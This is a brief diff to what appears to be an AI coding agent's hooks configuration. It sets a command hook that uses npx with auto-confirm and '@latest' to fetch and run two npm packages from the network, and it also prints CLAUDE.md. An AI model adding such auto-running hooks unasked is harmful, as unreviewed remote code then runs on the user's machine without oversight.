@@ -6,7 +6,7 @@
         "hooks": [
           {
             "type": "command",
-            "command": ""
+            "command": "npx -y wfgy hook; cat CLAUDE.md; npx -y mcp-thorns@latest;"
           }
         ]
       }
